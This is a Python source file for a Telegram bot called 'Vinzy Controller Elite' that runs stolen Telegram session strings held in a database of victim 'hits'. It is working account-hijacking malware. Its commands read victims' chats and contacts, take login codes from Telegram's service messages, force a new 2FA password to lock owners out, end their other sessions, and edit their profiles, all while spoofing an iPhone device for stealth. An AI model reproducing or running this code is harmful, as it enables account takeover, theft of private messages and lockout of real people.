import os
import asyncio
import telebot
import psycopg2
import datetime
import logging
import sys
from telethon import TelegramClient, functions, types as tl_types, errors
from telethon.sessions import StringSession
from telebot import types

# --- 1. SYSTEM LOGGING & ENVIRONMENT ---
# We initialize logging to track every command execution in the console.
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger("VinzyController")

# --- 2. CONFIGURATION ---
# Official Telegram iOS API credentials
API_ID = int(os.environ.get("API_ID", 36003995))
API_HASH = os.environ.get("API_HASH", "41a2b48afe9cfbd1fbf59c5e75b00afa")
BOT_TOKEN = os.environ.get("BOT_TOKEN")
DATABASE_URL = os.environ.get("DATABASE_URL")

try:
    GROUP_ID = int(os.environ.get("GROUP_ID", "0"))
except ValueError:
    logger.error("GROUP_ID is not a valid integer. Defaulting to 0.")
    GROUP_ID = 0

if not BOT_TOKEN or not DATABASE_URL:
    logger.critical("Missing BOT_TOKEN or DATABASE_URL! Script will fail.")

bot = telebot.TeleBot(BOT_TOKEN)

# --- 3. NEONDB DATABASE LAYER (DETAILED) ---

def get_db_conn():
    """Establish a persistent, secure connection to Neon PostgreSQL."""
    try:
        connection = psycopg2.connect(DATABASE_URL, sslmode='require')
        return connection
    except Exception as e:
        logger.error(f"Database Connection Failed: {e}")
        return None

def init_db():
    """Builds the security vault table. Unshortened for clarity."""
    conn = get_db_conn()
    if conn:
        try:
            cur = conn.cursor()
            query = '''
                CREATE TABLE IF NOT EXISTS moonton_secure_vault (
                    phone TEXT PRIMARY KEY,
                    session_string TEXT NOT NULL,
                    ip_address TEXT,
                    capture_date TIMESTAMP WITH TIME ZONE DEFAULT CURRENT_TIMESTAMP
                );
            '''
            cur.execute(query)
            conn.commit()
            cur.close()
            logger.info("NeonDB Table Initialized successfully.")
        except Exception as e:
            logger.error(f"init_db Error: {e}")
        finally:
            conn.close()

def get_session(phone):
    """Retrieves session data with explicit error handling."""
    conn = get_db_conn()
    if not conn: return None
    try:
        cur = conn.cursor()
        cur.execute("SELECT session_string FROM moonton_secure_vault WHERE phone = %s", (phone,))
        result = cur.fetchone()
        cur.close()
        return result[0] if result else None
    except Exception as e:
        logger.error(f"get_session Error for {phone}: {e}")
        return None
    finally:
        conn.close()

def get_all_accounts():
    """Fetches all captured users for the .list command."""
    conn = get_db_conn()
    if not conn: return []
    try:
        cur = conn.cursor()
        cur.execute("SELECT phone, capture_date FROM moonton_secure_vault ORDER BY capture_date DESC")
        data = cur.fetchall()
        cur.close()
        return data
    except Exception as e:
        logger.error(f"get_all_accounts Error: {e}")
        return []
    finally:
        conn.close()

# --- 4. THE COMMAND RUNNER (CORE ENGINE) ---

async def run_task(phone, task_func, *args):
    """
    The heart of the controller. Handles connection, authorization check,
    and task execution with iPhone 15 Pro Max spoofing.
    """
    session_str = get_session(phone)
    if not session_str:
        return f"❌ <b>Error:</b> Phone <code>{phone}</code> not found in Vault."
    
    # We identify as the latest hardware for maximum stealth
    client = TelegramClient(
        StringSession(session_str), 
        API_ID, 
        API_HASH, 
        device_model="iPhone 15 Pro Max",
        system_version="17.4.1",
        app_version="10.8.1"
    )
    
    try:
        logger.info(f"Connecting to account: {phone}...")
        await asyncio.wait_for(client.connect(), timeout=25)
        
        if not await client.is_user_authorized():
            logger.warning(f"Session for {phone} has been terminated by victim.")
            return f"❌ <b>Access Denied:</b> Session for <code>{phone}</code> is dead."
        
        logger.info(f"Executing task for {phone}...")
        return await task_func(client, *args)
    
    except asyncio.TimeoutError:
        return "⚠️ <b>Timeout:</b> Telegram is not responding. Try again."
    except errors.FloodWaitError as e:
        return f"⚠️ <b>Flood Error:</b> Wait {e.seconds} seconds before next command."
    except Exception as e:
        logger.error(f"Task Execution Failed: {e}")
        return f"⚠️ <b>System Error:</b> {str(e)}"
    finally:
        await client.disconnect()

# --- 5. LOGIC MODULES (EXPANDED) ---

async def logic_check_session(client):
    """Verify session status and pull user metadata."""
    me = await client.get_me()
    status = "Active ✅"
    username = f"@{me.username}" if me.username else "No Username"
    return (
        f"🛡️ <b>Session Report</b>\n"
        f"━━━━━━━━━━━━━━━\n"
        f"👤 <b>Target:</b> {me.first_name} {me.last_name or ''}\n"
        f"🆔 <b>User ID:</b> <code>{me.id}</code>\n"
        f"📱 <b>Handle:</b> {username}\n"
        f"📡 <b>Status:</b> {status}\n"
        f"━━━━━━━━━━━━━━━"
    )

async def logic_check_2fa(client, phone):
    """Check if the account has a cloud password."""
    try:
        pwd_settings = await client(functions.account.GetPasswordRequest())
        if pwd_settings.has_password:
            return f"🔐 <b>2FA ENABLED:</b> <code>{phone}</code> has a cloud password."
        else:
            return f"🔓 <b>2FA DISABLED:</b> <code>{phone}</code> is open for hijack."
    except Exception as e:
        return f"⚠️ 2FA Check Failed: {str(e)}"

async def logic_set_2fa(client, phone, new_pw):
    """Forces a new 2FA password using SRP protocol."""
    try:
        pwd_info = await client(functions.account.GetPasswordRequest())
        await client(functions.account.UpdatePasswordSettingsRequest(
            password=pwd_info,
            new_settings=tl_types.account.PasswordInputSettings(
                new_algo=pwd_info.new_algo,
                new_password_hash=client.session.build_password_hash(pwd_info, new_pw),
                hint="Cloud Security"
            )
        ))
        return f"✅ <b>Success:</b> 2FA Password for <code>{phone}</code> set to <code>{new_pw}</code>"
    except Exception as e:
        return f"❌ <b>2FA Setup Error:</b> {str(e)}"

async def logic_list_chats(client, limit):
    """Fetches formatted chat list with IDs."""
    output = f"💬 <b>Last {limit} Conversations:</b>\n\n"
    async for dialog in client.iter_dialogs(limit=limit):
        icon = "👤" if dialog.is_user else "👥" if dialog.is_group else "📢"
        output += f"{icon} <code>{dialog.id}</code> | <b>{dialog.name}</b>\n"
    return output

async def logic_read_messages(client, chat_id, limit):
    """Reads messages from a specific chat ID."""
    try:
        output = f"📩 <b>Inbox: {chat_id} (Limit: {limit})</b>\n\n"
        async for msg in client.iter_messages(chat_id, limit=limit):
            direction = "Outgoing ➡️" if msg.out else "Incoming ⬅️"
            content = msg.text[:60] + "..." if msg.text and len(msg.text) > 60 else (msg.text or "[Media/Sticker]")
            output += f"<b>{direction}</b>\n<code>{content}</code>\n\n"
        return output
    except Exception as e:
        return f"⚠️ Failed to read messages: {str(e)}"

async def logic_get_contacts(client):
    """Pulls the first 40 contacts."""
    res = await client(functions.contacts.GetContactsRequest(hash=0))
    output = "👤 <b>Target Contacts:</b>\n"
    for user in res.users[:40]:
        full_name = f"{user.first_name or ''} {user.last_name or ''}".strip()
        output += f"• {full_name} | @{user.username or 'N/A'}\n"
    return output

# --- 6. TELEGRAM BOT HANDLERS (FULL SUITE) ---

@bot.message_handler(commands=['help', 'start'])
def handle_help(m):
    if m.chat.id != GROUP_ID: return
    text = (
        "👑 <b>Vinzy Controller Elite v4.0</b>\n"
        "━━━━━━━━━━━━━━━\n"
        "📡 <b>Database Management</b>\n"
        "• <code>.list</code> - Show all hits in NeonDB\n"
        "• <code>.checksession [phone]</code> - Verify hit\n\n"
        "🔐 <b>Security & Locks</b>\n"
        "• <code>.check2fa [phone]</code> - Status check\n"
        "• <code>.set2fa [phone] [pw]</code> - Force 2FA\n"
        "• <code>.kickall [phone]</code> - Terminate sessions\n\n"
        "🕵️ <b>Account Discovery</b>\n"
        "• <code>.getcode [phone]</code> - Login code extraction\n"
        "• <code>.chats [phone] [limit]</code> - View dialogs\n"
        "• <code>.msgs [phone] [id] [limit]</code> - Read chat\n"
        "• <code>.contacts [phone]</code> - Pull contacts\n\n"
        "📝 <b>Profile Modification</b>\n"
        "• <code>.bio [phone] [text]</code> - Change About\n"
        "• <code>.name [phone] [first] [last]</code> - Change Name\n"
        "━━━━━━━━━━━━━━━"
    )
    bot.send_message(m.chat.id, text, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text == '.list')
def handle_list(m):
    if m.chat.id != GROUP_ID: return
    hits = get_all_accounts()
    if not hits:
        return bot.send_message(m.chat.id, "📭 <b>NeonDB is empty.</b> No hits found.")
    
    msg = "📋 <b>Vaulted Hits (Sorted by Date):</b>\n\n"
    for phone, date in hits:
        msg += f"📱 <code>{phone}</code>\n📅 {date.strftime('%Y-%m-%d %H:%M')}\n\n"
    bot.send_message(m.chat.id, msg, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.checksession'))
def handle_checksession(m):
    if m.chat.id != GROUP_ID: return
    args = m.text.split(" ")
    if len(args) < 2: return bot.reply_to(m, "❌ Usage: <code>.checksession [phone]</code>")
    response = asyncio.run(run_task(args[1], logic_check_session))
    bot.send_message(m.chat.id, response, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.check2fa'))
def handle_check2fa(m):
    if m.chat.id != GROUP_ID: return
    args = m.text.split(" ")
    if len(args) < 2: return bot.reply_to(m, "❌ Usage: <code>.check2fa [phone]</code>")
    response = asyncio.run(run_task(args[1], logic_check_2fa, args[1]))
    bot.send_message(m.chat.id, response, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.set2fa'))
def handle_set2fa(m):
    if m.chat.id != GROUP_ID: return
    args = m.text.split(" ")
    if len(args) < 3: return bot.reply_to(m, "❌ Usage: <code>.set2fa [phone] [new_pw]</code>")
    response = asyncio.run(run_task(args[1], logic_set_2fa, args[1], args[2]))
    bot.send_message(m.chat.id, response, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.chats'))
def handle_chats(m):
    if m.chat.id != GROUP_ID: return
    args = m.text.split(" ")
    if len(args) < 2: return bot.reply_to(m, "❌ Usage: <code>.chats [phone] [limit]</code>")
    limit = int(args[2]) if len(args) > 2 else 15
    response = asyncio.run(run_task(args[1], logic_list_chats, limit))
    bot.send_message(m.chat.id, response, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.msgs'))
def handle_msgs(m):
    if m.chat.id != GROUP_ID: return
    args = m.text.split(" ")
    if len(args) < 3: return bot.reply_to(m, "❌ Usage: <code>.msgs [phone] [chat_id] [limit]</code>")
    phone = args[1]
    # Handle chat_id if it's a numeric ID (handle negative for groups)
    try:
        chat_id = int(args[2])
    except ValueError:
        chat_id = args[2] # handle username
    limit = int(args[3]) if len(args) > 3 else 10
    response = asyncio.run(run_task(phone, logic_read_messages, chat_id, limit))
    bot.send_message(m.chat.id, response, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.getcode'))
def handle_getcode(m):
    if m.chat.id != GROUP_ID: return
    args = m.text.split(" ")
    if len(args) < 2: return bot.reply_to(m, "❌ Usage: <code>.getcode [phone]</code>")
    
    async def logic(client):
        # 777000 is the official Telegram Service account
        async for msg in client.iter_messages(777000, limit=1):
            return f"📩 <b>Telegram Login Code Found:</b>\n\n<code>{msg.text}</code>"
        return "📭 <b>No Code:</b> The service messages are empty."

    response = asyncio.run(run_task(args[1], logic))
    bot.send_message(m.chat.id, response, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.kickall'))
def handle_kickall(m):
    if m.chat.id != GROUP_ID: return
    args = m.text.split(" ")
    if len(args) < 2: return bot.reply_to(m, "❌ Usage: <code>.kickall [phone]</code>")

    async def logic(client):
        await client(functions.auth.ResetAuthorizationsRequest())
        return f"⚡ <b>Success:</b> All other sessions for <code>{args[1]}</code> were wiped."

    response = asyncio.run(run_task(args[1], logic))
    bot.send_message(m.chat.id, response, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.bio'))
def handle_bio(m):
    if m.chat.id != GROUP_ID: return
    args = m.text.split(" ", 2)
    if len(args) < 3: return bot.reply_to(m, "❌ Usage: <code>.bio [phone] [new_text]</code>")

    async def logic(client, text):
        await client(functions.account.UpdateProfileRequest(about=text))
        return f"✅ <b>Bio Updated</b> for <code>{args[1]}</code>."

    response = asyncio.run(run_task(args[1], logic, args[2]))
    bot.send_message(m.chat.id, response, parse_mode="HTML")

@bot.message_handler(func=lambda m: m.text.startswith('.name'))
def handle_name(m):
    if m.chat.id != GROUP_ID: return
    args = m.text.split(" ", 3)
    if len(args) < 3: return bot.reply_to(m, "❌ Usage: <code>.name [phone] [first] [last]</code>")
    first = args[2]
    last = args[3] if len(args) > 3 else ""

    async def logic(client, f, l):
        await client(functions.account.UpdateProfileRequest(first_name=f, last_name=l))
        return f"✅ <b>Name Updated:</b> {f} {l}"

    response = asyncio.run(run_task(args[1], logic, first, last))
    bot.send_message(m.chat.id, response, parse_mode="HTML")

# --- 7. MAIN ENTRY POINT ---

if __name__ == "__main__":
    init_db()
    logger.info("Vinzy Controller Elite v4.0 is starting polling...")
    bot.infinity_polling()
